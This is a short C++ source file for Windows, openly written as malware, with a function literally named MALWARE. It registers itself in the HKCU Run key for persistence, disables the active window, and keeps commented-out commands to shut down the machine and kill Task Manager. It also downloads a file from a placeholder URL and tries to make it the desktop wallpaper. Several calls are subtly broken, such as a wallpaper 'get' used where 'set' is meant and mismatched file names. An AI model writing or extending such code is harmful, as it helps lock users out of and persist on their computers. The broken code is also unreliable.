#include <Windows.h>
#include <chrono>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")
#define MAX_PATH 512
using namespace std;
void MALWARE() {
	HKEY hkey;
	LPCWSTR programm = L"C:\\txt.exe";
	char arr[MAX_PATH] = { };
	GetModuleFileName(NULL, (LPWSTR)arr, MAX_PATH);
	RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, NULL, KEY_ALL_ACCESS, NULL, &hkey, NULL); {
		RegSetValueEx(hkey, programm, NULL, REG_SZ, (LPBYTE)arr, sizeof(arr)); {
			RegCloseKey(hkey);
		}
	}

		
}
void blockScreen() {
	try {
		HWND hwnd = GetActiveWindow();
		EnableWindow(hwnd, false);
		//system("shutdown -P");
		//system("taskkill /IM taskmgr.exe /F");
	}
	catch (exception e) {

	}

}
void Loader() {
	try {
		URLDownloadToFile(0, L"url", L"C:\\wallpaper.png", 0, 0);
		SystemParametersInfo(SPI_GETDESKWALLPAPER, 0, (PVOID)L"C:\\wallpaper.jpeg", SPIF_UPDATEINIFILE);
		OFSTRUCT buff[OFS_MAXPATHNAME] = { };
		OpenFile((LPCSTR)L"C:\\wallpaper.jpeg", (LPOFSTRUCT)&buff, OF_READ);
	}
	catch (exception e) {

	}
}

int main() {
	HMODULE hModule;
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Loader, hModule, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MALWARE, hModule, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)blockScreen, hModule, NULL, NULL);
}
